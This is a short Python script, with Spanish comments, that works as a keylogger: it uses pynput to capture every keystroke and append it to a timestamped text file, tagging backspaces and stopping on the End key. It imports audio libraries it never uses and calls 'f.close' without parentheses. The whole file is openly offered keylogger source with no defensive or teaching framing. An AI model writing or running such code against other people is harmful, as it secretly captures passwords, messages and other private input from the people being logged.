from pynput.keyboard import Listener
import datetime
import time
import pyaudio 
import wave 

d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
name = 'keylogger_{}.txt'.format(d)
global t0
t0= time.time()

# ----prueba de funcionalidades------

def key_reco(key):
    key = str(key)
    print(key)
    print(1)
    if key == 'Key.end':
        print("\nSaliendo del keylogger\n")
        quit()

# ------------Funcional--------------

def key_recorder(key):
    global t0
    f = open(name, "a")
    key = str(key)
    if key == 'Key.enter':
        f.write('\n')
    elif key == 'Key.space':
        f.write(' ')
    elif key == 'Key.backspace':
        f.write("%BORRAR%")
    elif key == 'Key.end':
        f.write("\nSaliendo del keylogger\n")
        f.close
        quit()
    else:
        f.write(key.replace("'", ""))
    
    if time.time()-t0>60:
        t0 = time.time()
        f.write("\nguardando\n")
        f.close

with Listener(on_press=key_recorder) as l:
    l.join()
    
